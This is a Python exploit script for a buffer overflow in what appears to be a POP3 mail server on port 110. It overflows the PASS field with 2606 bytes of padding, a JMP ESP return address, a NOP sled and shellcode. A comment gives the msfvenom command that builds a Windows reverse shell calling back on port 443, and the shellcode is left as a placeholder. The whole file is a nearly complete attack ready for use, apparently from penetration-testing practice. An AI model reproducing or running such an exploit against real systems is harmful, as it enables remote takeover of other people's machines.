import socket
import struct
import sys


rhost="192.168."
rport=110

size = 3200
# 5F4A358F   FFE4             JMP ESP
ptr_jmp_esp = 0x5F4A358F

payload = ""
payload += "PASS "
payload += "A"*2606
payload += struct.pack("<I",ptr_jmp_esp)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b "\x00\x0a\x0d" --var-name shellcode EXITFUNC=thread
<paste shellcode here>
nopsled = "\x90"*12 # put appropriate number of nops

payload += nopsled
payload += shellcode
payload += "D"*(size - len(payload))
payload += "\r\n"

try:
    print "Sending evil code..."
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((rhost,rport))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send(payload)
    s.close()
except:
    print "Oops! Something went wrong!"
    sys.exit()

    